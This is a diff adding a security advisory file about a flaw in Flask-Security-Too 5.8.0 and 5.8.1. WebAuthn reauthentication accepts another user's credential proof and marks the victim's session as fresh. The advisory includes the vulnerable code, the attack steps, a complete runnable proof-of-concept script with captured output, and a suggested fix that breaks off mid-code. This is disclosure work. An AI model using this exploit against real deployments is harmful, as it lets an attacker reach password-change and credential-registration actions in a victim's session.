@@ -1,0 +1,693 @@
+[basic]
+description = '''
+### Summary
+
+Flask-Security-Too 5.8.0 and 5.8.1 mark a session as reauthentication-fresh after processing a WebAuthn assertion whose proven credential belongs to a different user than the currently authenticated session user. The check that `GHSA-97r5-pg8x-p63p` added on the OAuth reauthentication path (`user.email == current_user.email`) is missing on the WebAuthn reauthentication path. An attacker who owns any WebAuthn credential registered to any account on the deployment can satisfy a victim session's freshness gate by submitting their own WebAuthn proof into the victim session.
+
+### Affected versions
+
+`Flask-Security-Too` `>= 5.8.0, <= 5.8.1` (current `main` commit `5c44c76e33a20b67d02115e26d2da4bab18c094e`).
+`GHSA-97r5-pg8x-p63p` (published 2026-05-22) shipped its fix in 5.8.1 only on `oauth_glue.py`; `webauthn.py` was not touched and remains exploitable in 5.8.1.
+
+### Privilege required
+
+Authenticated attacker on the same Flask-Security deployment, owning at least one WebAuthn credential of any usage (`first` / `secondary` / verify) that is registered to their own account. The attacker also needs the ability to drive HTTP requests against the WebAuthn endpoints inside the victim session (e.g. a separate gadget such as CSRF + cookie-based auth, an XSS that doesn't reach the cookie itself but can move the session through endpoints, or an existing session-fixation gadget; or the rarer but easier case of an attacker who has direct access to the victim's not-yet-fresh session via a shared browser). The point of the freshness gate is to defend exactly that \"I have the session but it isn't fresh enough to do sensitive things\" position, so any context in which freshness would have protected the victim is also the context in which this bypass matters.
+
+### Vulnerable code
+
+[`flask_security/webauthn.py:846-889`](https://github.com/pallets-eco/flask-security/blob/5c44c76e33a20b67d02115e26d2da4bab18c094e/flask_security/webauthn.py#L846-L889) (commit
+`5c44c76e33a20b67d02115e26d2da4bab18c094e`):
+
+```python
+@auth_required(lambda: cv(\"API_ENABLED_METHODS\"))
+def webauthn_verify_response(token: str) -> ResponseValue:
+    form = t.cast(
+        WebAuthnSigninResponseForm, build_form_from_request(\"wan_signin_response_form\")
+    )
+
+    expired, invalid, state = check_and_get_token_status(
+        token, \"wan\", get_within_delta(\"WAN_SIGNIN_WITHIN\")
+    )
+    ...
+    form.challenge = state[\"challenge\"]
+    form.user_verification = state[\"user_verification\"]
+    form.is_secondary = False
+    form.is_verify = True
+
+    if form.validate_on_submit():
+        # update last use and sign count
+        after_this_request(view_commit)
+        assert form.cred
+        assert form.user
+        form.cred.lastuse_datetime = _security.datetime_factory()
+        form.cred.sign_count = form.authentication_verification.new_sign_count
+        _datastore.put(form.cred)
+
+        # verified - so set freshness time.
+        session[\"fs_paa\"] = time.time()
+        ...
+```
+
+[`flask_security/webauthn.py:276-308`](https://github.com/pallets-eco/flask-security/blob/5c44c76e33a20b67d02115e26d2da4bab18c094e/flask_security/webauthn.py#L276-L308) (the form's `validate()`):
+
+```python
+def validate(self, **kwargs: t.Any) -> bool:
+    if not super().validate(**kwargs):
+        return False  # pragma: no cover
+    ...
+    try:
+        auth_cred = parse_authentication_credential_json(self.credential.data)
+    except (...):
+        ...
+        return False
+
+    # Look up credential Id (raw_id) and user. 7.2.6/7
+    self.cred = _datastore.find_webauthn(credential_id=auth_cred.raw_id)
+    ...
+    # This shouldn't be able to happen if datastore properly cascades delete
+    self.user = _datastore.find_user_from_webauthn(self.cred)
+```
+
+`self.user` is resolved from the attacker-controlled `credential_id` and is never compared to `current_user`. The state token issued by `_signin_common` ([`webauthn.py:589-622`](https://github.com/pallets-eco/flask-security/blob/5c44c76e33a20b67d02115e26d2da4bab18c094e/webauthn.py#L589-L622)) carries only `{challenge, user_verification}`, so state tokens are not bound to any user and replay portably across sessions:
+
+```python
+def _signin_common(user: UserMixin | None, usage: list[str]) -> tuple[t.Any, str]:
+    ...
+    state = {
+        \"challenge\": challenge,
+        \"user_verification\": uv,
+    }
+    ...
+    state_token = t.cast(str, _security.wan_serializer.dumps(state))
+    return o_json, state_token
+```
+
+Contrast with the patch in [`oauth_glue.py:211`](https://github.com/pallets-eco/flask-security/blob/5c44c76e33a20b67d02115e26d2da4bab18c094e/oauth_glue.py#L211) that `GHSA-97r5-pg8x-p63p` shipped:
+
+```python
+next_loc = session.pop(\"fs_oauth_next\", None)
+if user and user.email == current_user.email:
+    # verified - so set freshness time.
+    session[\"fs_paa\"] = time.time()
+```
+
+That `user.email == current_user.email` clamp is the missing check on the WebAuthn side.
+
+### How input reaches the sink
+
+1. Attacker logs in to their own account and registers their own WebAuthn
+   credential (call it `cred_attacker`). They retain a copy of any valid
+   `navigator.credentials.get()` assertion JSON produced by their authenticator
+   (one signature is enough; can also be produced fresh on demand per request).
+2. Attacker holds, or gets, a victim session in a state where `fs_paa` is past
+   `FRESHNESS`. The victim is authenticated as themselves; the gate stops them
+   from invoking freshness-protected business endpoints (`/change`,
+   `/change-username`, `/wf-add`, `/us-setup`, anything decorated with
+   `@auth_required(within=...)`).
+3. The victim session calls `POST /wan-verify` and receives a `wan_state`
+   token. The state token has no user binding.
+4. Attacker submits an assertion that proves possession of `cred_attacker`,
+   inside the victim session, to `POST /wan-verify/<wan_state>`.
+5. `WebAuthnSigninResponseForm.validate` resolves `form.user` to the attacker
+   account from `find_user_from_webauthn(self.cred)`, signs/verifies the
+   assertion against the (attacker-controlled) public key it stored at
+   registration time, and returns `True`. The user-handle check on
+   `auth_cred.response.user_handle` (if present) compares against
+   `self.user.fs_webauthn_user_handle`, i.e. it compares attacker user-handle
+   to attacker user, so it passes trivially.
+6. `webauthn_verify_response` then writes `session[\"fs_paa\"] = time.time()`.
+   The session user is unchanged (still the victim) but the freshness clock
+   is reset by a cryptographic proof of the attacker's authenticator.
+7. Any subsequent `@auth_required(within=...)` endpoint now succeeds inside
+   the victim session.
+
+### End-to-end reproduction
+
+Reproduction is an in-process Flask test client driving the published wheel (`pip install Flask-Security-Too==5.8.0`, also re-run against 5.8.1 since `GHSA-97r5-pg8x-p63p`'s fix shipped with that release only touched `oauth_glue.py`). The full transcript is in the Proof of concept section below; here is the boot recipe:
+
+```bash
+python3.12 -m venv venv
+source venv/bin/activate
+pip install --quiet 'Flask-Security-Too==5.8.0' Flask-SQLAlchemy webauthn email-validator argon2_cffi
+python poc.py
+```
+
+Captured run-time output (5.8.0 path):
+
+```
+=== Submit BOB's WebAuthn assertion to Alice's /wan-verify-response ===
+  cross-user assertion status: 200
+  alice fs_uniquifier in session AFTER: '408245d132bc4213a55606c46f40e038'   # still Alice
+  fs_paa BEFORE: 1779582282.550872
+  fs_paa AFTER : 1779585882.615287                                            # advanced
+=== Demonstrate impact: /sensitive (freshness-protected) accepted ===
+  /sensitive after cross-user verify status: 200
+```
+
+Re-run against 5.8.1 produces the same `200` on the cross-user assertion and the same `200` on the freshness-gated endpoint, confirming that the patch for `GHSA-97r5-pg8x-p63p` did not extend to the WebAuthn path.
+
+### Proof of concept
+
+Mocked WebAuthn fixtures (`REG_DATA_UV`, `SIGNIN_DATA_UV`, `REG_DATA1`, `SIGNIN_DATA1`) and `HackWebauthnUtil` are lifted verbatim from the project's own test suite ([`tests/test_webauthn.py`](https://github.com/pallets-eco/flask security/blob/5c44c76e33a20b67d02115e26d2da4bab18c094e/tests/test_webauthn.py)) which pins the challenge so a recorded assertion blob can be replayed; this does not bypass any cryptographic check inside `webauthn.verify_authentication_response`, it just substitutes the test-suite's own `WebauthnUtil` so the recorded blobs can be exercised against a running app instance. In a real-world deployment the attacker uses their own authenticator producing fresh assertions per request.
+
+`poc.py` (complete, runnable; the `REG_DATA*` / `SIGNIN_DATA*` fixtures are the project's own `tests/test_webauthn.py` blobs, reproduced in full):
+
+```python
+\"\"\"
+E2E PoC for Flask-Security-Too 5.8.0 WebAuthn reauthentication freshness bypass
+via cross-user assertion.
+
+Sibling of GHSA-97r5-pg8x-p63p (OAuth path, fixed in 5.8.1). The WebAuthn
+verify path (`webauthn.py:847-889 webauthn_verify_response` +
+`webauthn.py:276-366 WebAuthnSigninResponseForm.validate`) sets
+`session[\"fs_paa\"] = time.time()` whenever a syntactically valid WebAuthn
+assertion completes, without checking that the assertion's resolved user
+equals the current session user.
+
+Setup:
+  - Alice and Bob both registered as users.
+  - Each registers their own WebAuthn credential (REG_DATA_UV for Alice as
+    primary-usage key, REG_DATA1 for Bob as primary-usage key).
+  - Alice authenticates via password. Her freshness timestamp is rolled back
+    to simulate a stale session (the standard reauthn precondition).
+  - Alice's session attempts /wan-verify and gets a state_token. The state
+    token only contains {challenge, user_verification} -- no user binding.
+  - Alice's session POSTs to /wan-verify/<state_token> with BOB's WebAuthn
+    credential signature (SIGNIN_DATA1).
+  - validate() resolves form.user from Bob's credential_id without checking
+    against current_user. webauthn_verify_response writes
+    session[\"fs_paa\"] = time.time().
+  - Alice now passes the freshness gate using a proof of Bob's credential.
+
+Outcome: a freshness-protected endpoint (/fresh, /change-username, etc.)
+responds 200 for Alice's session even though the only credential proof
+provided was Bob's. This is the same trust-contract violation that
+GHSA-97r5-pg8x-p63p patched on the OAuth path.
+\"\"\"
+
+import copy
+import datetime as dt
+import json
+import re
+import time
+from datetime import timedelta
+
+from flask import Flask, jsonify
+from flask_sqlalchemy import SQLAlchemy
+from flask_security import (
+    Security,
+    SQLAlchemyUserDatastore,
+    auth_required,
+    hash_password,
+)
+from flask_security.models import fsqla_v3 as fsqla
+from flask_security.webauthn_util import WebauthnUtil
+
+# Fixtures lifted verbatim from tests/test_webauthn.py
+CHALLENGE = \"smCCiy_k2CqQydSQ_kPEjV5a2d0ApfatcpQ1aXDmQPo\"
+
+REG_DATA_UV = {
+    \"id\": \"s3xZpfGy0ZH-sSkfxIsgChwbkw_O0jOFtZeJ1LXUMEa8atG1oEskNqmFJCfgKZGy\",
+    \"rawId\": \"s3xZpfGy0ZH-sSkfxIsgChwbkw_O0jOFtZeJ1LXUMEa8atG1oEskNqmFJCfgKZGy\",
+    \"type\": \"public-key\",
+    \"response\": {
+        \"attestationObject\": \"o2NmbXRkbm9uZWdhdHRTdG10oGhhdXRoRGF0YVjC\"
+        \"SZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2PFAAAABAAAAA\"
+        \"AAAAAAAAAAAAAAAAAAMLN8WaXxstGR_rEpH8SLIAocG5MPztIzhbWXi\"
+        \"dS11DBGvGrRtaBLJDaphSQn4CmRsqUBAgMmIAEhWCCzfFml8bLRkf\"
+        \"6xKR_EUnaoI333MuxRlv5-LwojDibdTyJYIFMifFwn-RfkDDgsTHF\"
+        \"jWgE6bld-Jc4nhFMTkQja9P8IoWtjcmVkUHJvdGVjdAI\",
+        \"clientDataJSON\": \"eyJ0eXBlIjoid2ViYXV0aG4uY3JlYXRlIiwiY2hhbGxlbmdlIjoiYzI\"
+        \"xRFEybDVYMnN5UTNGUmVXUlRVVjlyVUVWcVZqVmhNbVF3UVhCbVlY\"
+        \"UmpjRkV4WVZoRWJWRlFidyIsIm9yaWdpbiI6Imh0dHA6Ly9sb2Nhb\"
+        \"Ghvc3Q6NTAwMSIsImNyb3NzT3JpZ2luIjpmYWxzZX0\",
+        \"transports\": [\"nfc\", \"usb\"],
+    },
+    \"extensions\": '{\"credProps\":{\"rk\":true}}',
+}
+SIGNIN_DATA_UV = {
+    \"id\": \"s3xZpfGy0ZH-sSkfxIsgChwbkw_O0jOFtZeJ1LXUMEa8atG1oEskNqmFJCfgKZGy\",
+    \"rawId\": \"s3xZpfGy0ZH-sSkfxIsgChwbkw_O0jOFtZeJ1LXUMEa8atG1oEskNqmFJCfgKZGy\",
+    \"type\": \"public-key\",
+    \"response\": {
+        \"authenticatorData\": \"SZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2MFAAAABQ==\",
+        \"clientDataJSON\": \"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiYzIxRFEy\"
+        \"bDVYMnN5UTNGUmVXUlRVVjlyVUVWcVZqVmhNbVF3UVhCbVlYUmpjRkV4W\"
+        \"VZoRWJWRlFidyIsIm9yaWdpbiI6Imh0dHA6Ly9sb2NhbGhvc3Q6NTAwMSI\"
+        \"sImNyb3NzT3JpZ2luIjpmYWxzZX0=\",
+        \"signature\": \"MEUCIQDR0m9Ob4nqVGiAPUf1Tu5XohDh2frl1LJ6G41GURlUIgIgKUPfkw\"
+        \"AjP2863L2nDhcR2EKqoGEQLqlQ5xymZstyO6o=\",
+    },
+    \"assertionClientExtensions\": \"{}\",
+}
+REG_DATA1 = {
+    \"id\": \"wUUqNOjY35dcT-vpikZpZx-T91NjIe4PqrV8j7jYPOc\",
+    \"rawId\": \"wUUqNOjY35dcT-vpikZpZx-T91NjIe4PqrV8j7jYPOc\",
+    \"type\": \"public-key\",
+    \"response\": {
+        \"attestationObject\": \"o2NmbXRkbm9uZWdhdHRTdG10oGhhdXRoRGF0YVikSZYN5YgOjGh0NB\"
+        \"cPZHZgW4_krrmihjLHmVzzuoMdl2NFAAAAAQAAAAAAAAAAAAAAAAAAA\"
+        \"AAAIMFFKjTo2N-XXE_r6YpGaWcfk_dTYyHuD6q1fI-42DznpQECAy\"
+        \"YgASFYIFRipoWMEiDuCtLUvSlqCFZBqxvUuNqZKavlWgvN2BK8Il\"
+        \"ggLOV4eez9k0det5oIZGyKanGkmWa0hygnjjFmf8Rep6c\",
+        \"clientDataJSON\": \"eyJ0eXBlIjoid2ViYXV0aG4uY3JlYXRlIiwiY2hhbGxlbmdlIjoiYzIxR\"
+        \"FEybDVYMnN5UTNGUmVXUlRVVjlyVUVWcVZqVmhNbVF3UVhCbVlYUmpjRk\"
+        \"V4WVZoRWJWRlFidyIsIm9yaWdpbiI6Imh0dHA6Ly9sb2NhbGhvc3Q6NT\"
+        \"AwMSIsImNyb3NzT3JpZ2luIjpmYWxzZX0\",
+        \"transports\": [\"usb\"],
+    },
+    \"extensions\": '{\"credProps\": {}}',
+}
+SIGNIN_DATA1 = {
+    \"id\": \"wUUqNOjY35dcT-vpikZpZx-T91NjIe4PqrV8j7jYPOc\",
+    \"rawId\": \"wUUqNOjY35dcT-vpikZpZx-T91NjIe4PqrV8j7jYPOc\",
+    \"type\": \"public-key\",
+    \"response\": {
+        \"authenticatorData\": \"SZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2MBAAAABQ==\",
+        \"clientDataJSON\": \"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiYzIxRFEy\"
+        \"bDVYMnN5UTNGUmVXUlRVVjlyVUVWcVZqVmhNbVF3UVhCbVlYUmpjRkV4\"
+        \"WVZoRWJWRlFidyIsIm9yaWdpbiI6Imh0dHA6Ly9sb2NhbGhvc3Q6NTAw\"
+        \"MSIsImNyb3NzT3JpZ2luIjpmYWxzZX0=\",
+        \"signature\": \"MEUCIH5VdRXxfnoxfrVk72gvWAn91QH-l2UrIohk5YOWi9XpAiEAn6f9oHtFS\"
+        \"68HVf6K_Ku0L33C0sID2HzpJWSiTNgJlbU=\",
+    },
+    \"assertionClientExtensions\": \"{}\",
+}
+
+
+class HackWebauthnUtil(WebauthnUtil):
+    \"\"\"Mirrors tests/test_webauthn.py: pins the challenge to the value embedded
+    in REG_DATA / SIGNIN_DATA so the cryptographic verification accepts the
+    pre-recorded blobs. Standard PoC technique used by the project's own test
+    suite. Does NOT change the vulnerable code path.\"\"\"
+
+    def generate_challenge(self, nbytes=None):
+        return CHALLENGE
+
+    def origin(self):
+        return \"http://localhost:5001\"
+
+
+def build_app():
+    app = Flask(__name__)
+    app.config[\"SECRET_KEY\"] = \"poc-secret\"
+    app.config[\"SECURITY_PASSWORD_SALT\"] = \"poc-salt\"
+    app.config[\"SQLALCHEMY_DATABASE_URI\"] = \"sqlite:///:memory:\"
+    app.config[\"SQLALCHEMY_TRACK_MODIFICATIONS\"] = False
+    app.config[\"WTF_CSRF_ENABLED\"] = False
+    app.config[\"SERVER_NAME\"] = \"localhost:5001\"
+
+    app.config[\"SECURITY_WEBAUTHN\"] = True
+    app.config[\"SECURITY_WAN_ALLOW_AS_FIRST_FACTOR\"] = True
+    app.config[\"SECURITY_WAN_ALLOW_AS_VERIFY\"] = [\"first\", \"secondary\"]
+    app.config[\"SECURITY_WAN_ALLOW_AS_MULTI_FACTOR\"] = True
+    app.config[\"SECURITY_FRESHNESS\"] = timedelta(minutes=1)
+    app.config[\"SECURITY_FRESHNESS_GRACE_PERIOD\"] = timedelta(seconds=0)
+    app.config[\"SECURITY_CHANGEABLE\"] = True
+    app.config[\"SECURITY_USERNAME_ENABLE\"] = False
+    app.config[\"SECURITY_FRESHNESS\"] = timedelta(seconds=10)
+
+    db = SQLAlchemy(app)
+    fsqla.FsModels.set_db_info(db)
+
+    class Role(db.Model, fsqla.FsRoleMixin):
+        pass
+
+    class WebAuthn(db.Model, fsqla.FsWebAuthnMixin):
+        pass
+
+    class User(db.Model, fsqla.FsUserMixin):
+        pass
+
+    ds = SQLAlchemyUserDatastore(db, User, Role, WebAuthn)
+    app.security = Security(
+        app, datastore=ds, webauthn_util_cls=HackWebauthnUtil
+    )
+
+    # A representative freshness-protected business endpoint. Same gate the
+    # built-in /change, /change-username, /wf-add etc. use.
+    @app.route(\"/sensitive\", methods=[\"POST\"])
+    @auth_required(
+        within=lambda: app.config[\"SECURITY_FRESHNESS\"],
+        grace=lambda: app.config[\"SECURITY_FRESHNESS_GRACE_PERIOD\"],
+    )
+    def sensitive():
+        return jsonify({\"ok\": True}), 200
+
+    with app.app_context():
+        db.create_all()
+        ds.create_user(
+            email=\"alice@example.com\",
+            password=hash_password(\"alice-password\"),
+            confirmed_at=dt.datetime.now(dt.timezone.utc),
+        )
+        ds.create_user(
+            email=\"bob@example.com\",
+            password=hash_password(\"bob-password\"),
+            confirmed_at=dt.datetime.now(dt.timezone.utc),
+        )
+        db.session.commit()
+
+    return app
+
+
+def _register_start_json(client, name, usage=\"first\"):
+    resp = client.post(\"/wan-register\", json=dict(name=name, usage=usage))
+    assert resp.status_code == 200, resp.data
+    return f'/wan-register/{resp.json[\"response\"][\"wan_state\"]}'
+
+
+def login_password(client, email, password):
+    resp = client.post(
+        \"/login\",
+        json=dict(email=email, password=password),
+        headers={\"Content-Type\": \"application/json\", \"Accept\": \"application/json\"},
+    )
+    assert resp.status_code == 200, resp.data
+    return resp
+
+
+def logout(client):
+    return client.post(
+        \"/logout\",
+        headers={\"Content-Type\": \"application/json\", \"Accept\": \"application/json\"},
+    )
+
+
+def step(label):
+    print(f\"\n=== {label} ===\")
+
+
+def main():
+    app = build_app()
+
+    print(f\"flask-security version under test: {__import__('flask_security').__version__}\")
+
+    # Step 1: Bob logs in, registers his WebAuthn credential, logs out
+    step(\"Bob registers his WebAuthn credential (attacker's own key)\")
+    bob_client = app.test_client()
+    login_password(bob_client, \"bob@example.com\", \"bob-password\")
+    url = _register_start_json(bob_client, name=\"bobkey\", usage=\"first\")
+    r = bob_client.post(url, json=dict(credential=json.dumps(REG_DATA1)))
+    assert r.status_code == 200, r.data
+    print(f\"  bob register status: {r.status_code}\")
+    logout(bob_client)
+
+    # Step 2: Alice logs in, registers her own WebAuthn credential, stays logged in
+    step(\"Alice registers her own WebAuthn credential (victim's key)\")
+    alice_client = app.test_client()
+    login_password(alice_client, \"alice@example.com\", \"alice-password\")
+    url = _register_start_json(alice_client, name=\"alicekey\", usage=\"first\")
+    r = alice_client.post(url, json=dict(credential=json.dumps(REG_DATA_UV)))
+    assert r.status_code == 200, r.data
+    print(f\"  alice register status: {r.status_code}\")
+
+    # Step 3: Confirm Alice's session can hit /sensitive while fresh (sanity)
+    step(\"Confirm /sensitive works while session is fresh\")
+    r = alice_client.post(
+        \"/sensitive\",
+        json=dict(),
+        headers={\"Content-Type\": \"application/json\", \"Accept\": \"application/json\"},
+    )
+    print(f\"  /sensitive while fresh status: {r.status_code}\")
+    assert r.status_code == 200, r.data
+
+    # Step 4: Roll Alice's fs_paa back to simulate a stale session
+    step(\"Stale Alice's session (roll fs_paa back past FRESHNESS)\")
+    with alice_client.session_transaction() as sess:
+        old_paa = sess[\"fs_paa\"] - 3600
+        sess[\"fs_paa\"] = old_paa
+        sess.pop(\"fs_gexp\", None)
+        alice_identity = sess.get(\"_user_id\")
+    print(f\"  alice fs_uniquifier in session: {alice_identity!r}\")
+    print(f\"  alice fs_paa now: {old_paa}\")
+
+    # Step 5: Confirm freshness gate now denies Alice
+    step(\"Confirm /sensitive now requires reauth (401 reauth_required)\")
+    r = alice_client.post(
+        \"/sensitive\",
+        json=dict(),
+        headers={\"Content-Type\": \"application/json\", \"Accept\": \"application/json\"},
+    )
+    print(f\"  /sensitive after stale status: {r.status_code}\")
+    print(f\"  body: {r.json}\")
+    assert r.status_code == 401
+    assert r.json[\"response\"][\"reauth_required\"] is True
+
+    # Step 6: Alice's session calls /wan-verify -> gets state_token.
+    # The state_token contains {challenge, user_verification} only -- no user
+    # binding -- and the WebAuthn challenge it embeds is the pinned constant
+    # CHALLENGE because HackWebauthnUtil overrides generate_challenge. That
+    # matches the challenge baked into Bob's pre-recorded SIGNIN_DATA1.
+    step(\"Alice fetches /wan-verify state_token\")
+    r = alice_client.post(
+        \"/wan-verify\",
+        json=dict(),
+        headers={\"Content-Type\": \"application/json\", \"Accept\": \"application/json\"},
+    )
+    assert r.status_code == 200, r.data
+    wan_state = r.json[\"response\"][\"wan_state\"]
+    print(f\"  wan_state acquired (truncated): {wan_state[:80]}...\")
+
+    # Step 7: Alice's session POSTs Bob's SIGNIN_DATA to /wan-verify/<state_token>.
+    # WebAuthnSigninResponseForm.validate() resolves form.user from
+    # SIGNIN_DATA1.id == Bob's credential id, and never checks form.user ==
+    # current_user. webauthn_verify_response then writes
+    # session[\"fs_paa\"] = time.time() on Alice's session.
+    step(\"Submit BOB's WebAuthn assertion to Alice's /wan-verify-response\")
+    r = alice_client.post(
+        f\"/wan-verify/{wan_state}\",
+        json=dict(credential=json.dumps(SIGNIN_DATA1)),
+        headers={\"Content-Type\": \"application/json\", \"Accept\": \"application/json\"},
+    )
+    print(f\"  cross-user assertion status: {r.status_code}\")
+    print(f\"  body: {r.json}\")
+    assert r.status_code == 200, \"Expected webauthn_verify_response to accept cross-user assertion\"
+
+    # Step 8: Inspect Alice's session. fs_paa should be freshly updated even
+    # though the proof was Bob's credential.
+    with alice_client.session_transaction() as sess:
+        new_paa = sess[\"fs_paa\"]
+        post_attack_identity = sess.get(\"_user_id\")
+    print(f\"  alice fs_uniquifier in session AFTER: {post_attack_identity!r}\")
+    print(f\"  fs_paa BEFORE: {old_paa}\")
+    print(f\"  fs_paa AFTER : {new_paa}\")
+    assert new_paa > old_paa, \"fs_paa was NOT advanced -> not exploitable\"
+    assert post_attack_identity == alice_identity, \"Session swapped users -- different bug\"
+
+    # Step 9: Confirm Alice's session now passes the freshness-gated action.
+    step(\"Demonstrate impact: /sensitive (freshness-protected) accepted\")
+    r = alice_client.post(
+        \"/sensitive\",
+        json=dict(),
+        headers={\"Content-Type\": \"application/json\", \"Accept\": \"application/json\"},
+    )
+    print(f\"  /sensitive after cross-user verify status: {r.status_code}\")
+    print(f\"  body: {r.json}\")
+    assert r.status_code == 200, \"Freshness gate did NOT accept the cross-user proof\"
+
+    print(\"\n=== RESULT ===\")
+    print(\"Alice's session was reauthenticated using BOB's WebAuthn credential.\")
+    print(\"fs_paa advanced; freshness-gated endpoints accept Alice's session.\")
+    print(\"The session user is still Alice (this is reauth-freshness bypass,\")
+    print(\"not a login bypass) -- same trust-contract violation that\")
+    print(\"GHSA-97r5-pg8x-p63p fixed on the OAuth path.\")
+
+
+if __name__ == \"__main__\":
+    main()
+```
+
+Verbatim run-time output against the published `Flask-Security-Too==5.8.0`
+wheel (`$ python poc.py`):
+
+```
+flask-security version under test: 5.8.0
+
+=== Bob registers his WebAuthn credential (attacker's own key) ===
+  bob register status: 200
+
+=== Alice registers her own WebAuthn credential (victim's key) ===
+  alice register status: 200
+
+=== Confirm /sensitive works while session is fresh ===
+  /sensitive while fresh status: 200
+
+=== Stale Alice's session (roll fs_paa back past FRESHNESS) ===
+  alice fs_uniquifier in session: '408245d132bc4213a55606c46f40e038'
+  alice fs_paa now: 1779582282.550872
+
+=== Confirm /sensitive now requires reauth (401 reauth_required) ===
+  /sensitive after stale status: 401
+  body: {'meta': {'code': 401}, 'response': {'errors': ['You must reauthenticate to access this endpoint'], 'has_webauthn_verify_credential': True, 'oauth_enabled': False, 'oauth_providers': [], 'reauth_required': True, 'unified_signin_enabled': False}}
+
+=== Alice fetches /wan-verify state_token ===
+  wan_state acquired (truncated): eyJjaGFsbGVuZ2UiOiJzbUNDaXlfazJDcVF5ZFNRX2tQRWpWNWEyZDBBcGZhdGNwUTFhWERtUVBvIiwi...
+
+=== Submit BOB's WebAuthn assertion to Alice's /wan-verify-response ===
+  cross-user assertion status: 200
+  body: {'meta': {'code': 200}, 'response': {'csrf_token': 'IjYzMDk1YjZjMTUwOTJlOWU4ZjAxNTQ1ZDI3MTM4YzA1OWJkYjZmZjci.ahJTWg.cWM261xwKEAFJXa3SK-ioz6pTro', 'user': {}}}
+  alice fs_uniquifier in session AFTER: '408245d132bc4213a55606c46f40e038'
+  fs_paa BEFORE: 1779582282.550872
+  fs_paa AFTER : 1779585882.615287
+
+=== Demonstrate impact: /sensitive (freshness-protected) accepted ===
+  /sensitive after cross-user verify status: 200
+  body: {'ok': True}
+
+=== RESULT ===
+Alice's session was reauthenticated using BOB's WebAuthn credential.
+fs_paa advanced; freshness-gated endpoints accept Alice's session.
+The session user is still Alice (this is reauth-freshness bypass,
+not a login bypass) -- same trust-contract violation that
+GHSA-97r5-pg8x-p63p fixed on the OAuth path.
+```
+
+Re-run against the published `Flask-Security-Too==5.8.1` wheel (the release
+that shipped the `GHSA-97r5-pg8x-p63p` OAuth fix) is identical — the
+cross-user assertion is still accepted (`200`) and the freshness-gated
+endpoint is still reachable (`200`), confirming the parent fix did not
+extend to the WebAuthn path:
+
+```
+flask-security version under test: 5.8.1
+
+=== Bob registers his WebAuthn credential (attacker's own key) ===
+  bob register status: 200
+
+=== Alice registers her own WebAuthn credential (victim's key) ===
+  alice register status: 200
+
+=== Confirm /sensitive works while session is fresh ===
+  /sensitive while fresh status: 200
+
+=== Stale Alice's session (roll fs_paa back past FRESHNESS) ===
+  alice fs_uniquifier in session: 'c60d7c7a5a894575b396f8917c814e46'
+  alice fs_paa now: 1779582300.361872
+
+=== Confirm /sensitive now requires reauth (401 reauth_required) ===
+  /sensitive after stale status: 401
+  body: {'meta': {'code': 401}, 'response': {'errors': ['You must reauthenticate to access this endpoint'], 'has_webauthn_verify_credential': True, 'oauth_enabled': False, 'oauth_providers': [], 'reauth_required': True, 'unified_signin_enabled': False}}
+
+=== Alice fetches /wan-verify state_token ===
+  wan_state acquired (truncated): eyJjaGFsbGVuZ2UiOiJzbUNDaXlfazJDcVF5ZFNRX2tQRWpWNWEyZDBBcGZhdGNwUTFhWERtUVBvIiwi...
+
+=== Submit BOB's WebAuthn assertion to Alice's /wan-verify-response ===
+  cross-user assertion status: 200
+  body: {'meta': {'code': 200}, 'response': {'csrf_token': 'ImJiZTQ2YWJhMmJlMDJlNWU2NDE2ODI1Njc0Nzc4ZGJhYzYzZDBhOWEi.ahJTbA.gEq7o8QoNq5t-UnjM9SdR_9Mqw4', 'user': {}}}
+  alice fs_uniquifier in session AFTER: 'c60d7c7a5a894575b396f8917c814e46'
+  fs_paa BEFORE: 1779582300.361872
+  fs_paa AFTER : 1779585900.41935
+
+=== Demonstrate impact: /sensitive (freshness-protected) accepted ===
+  /sensitive after cross-user verify status: 200
+  body: {'ok': True}
+
+=== RESULT ===
+Alice's session was reauthenticated using BOB's WebAuthn credential.
+fs_paa advanced; freshness-gated endpoints accept Alice's session.
+The session user is still Alice (this is reauth-freshness bypass,
+not a login bypass) -- same trust-contract violation that
+GHSA-97r5-pg8x-p63p fixed on the OAuth path.
+```
+
+The session user remains Alice (`fs_uniquifier` unchanged), but `fs_paa`
+advances and the freshness-gated endpoint accepts the request, even though
+the only cryptographic proof presented was Bob's WebAuthn signature.
+
+### Impact
+
+- Bypass of `@auth_required(within=...)` freshness gates on the WebAuthn
+  reauthentication path. Any sensitive operation that relies on freshness
+  (built-in: `/change` password change, `/change-username`, `/wf-add` to
+  register a new WebAuthn credential, `/us-setup` to (re)configure unified
+  signin, `/mf-recovery-codes`; app-defined: any business route the
+  application protected with `@auth_required(within=...)`) is reachable
+  from an attacker-held victim session.
+- Promotes any session-handoff or session-holder gadget from \"victim still
+  protected against sensitive ops\" to \"attacker reaches sensitive ops\" using
+  the attacker's own authenticator.
+- Same trust-contract violation that `GHSA-97r5-pg8x-p63p` (rated medium)
+  was published to close on the OAuth path. The WebAuthn variant is
+  reachable wherever the project's WebAuthn-verify is enabled.
+
+### Suggested fix
+
+Add the equivalent of the OAuth fix in
+`flask_security/webauthn.py:webauthn_verify_response` so the cryptographically
+verified user must equal the currently authenticated session user before
+freshness is advanced:
+
+```python
+if form.validate_on_submit():
+    assert form.cred
+    assert form.user
+    if form.user != current_user._get_current_object():
+        # Cryptographic proof was valid, but for a different account; do not
+        # treat the current session as reauthenticated.
+        m, c = get_message(\"WEBAUTHN_MISMATCH_USER_HANDLE\")
+        if _security._want_json(request):
+            form.form_errors.append(m)
+            return base_render_json(form, include_user=False)
+        do_flash(m, c)
+        return redirect(url_for_security(\"wan_verify\"))
+
+    after_this_request(view_commit)
+    form.cred.lastuse_datetime = _security.datetime_factory()
+    form.cred.sign_count = form.authentication_verification.new_sign_count
+    _datastore.put(form.cred)
+    session[\"fs_paa\"] = time.time()
+    ...
+```
+
+Equivalent pattern (and arguably tighter) is to add a bind into the state
+token issued by `_signin_common` when called from `webauthn_verify` (the
+caller already holds `form.user = current_user`):
+
+```python
+def _signin_common(user, usage):
+    ...
+    state = {
+        \"challenge\": challenge,
+        \"user_verification\": uv,
